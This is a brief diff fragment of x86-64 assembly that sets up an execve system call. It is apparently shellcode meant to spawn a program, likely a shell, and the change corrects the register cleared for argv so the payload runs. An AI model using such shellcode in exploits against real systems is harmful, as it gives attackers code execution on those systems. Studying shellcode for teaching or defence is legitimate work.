@@ -46,7 +46,7 @@
         push rdi
         mov rdi, rsp
         xor rdx, rdx
-        xor rcx, rcx
+        xor rsi, rsi
         xor rax, rax
         add al, 0x3b
         syscall
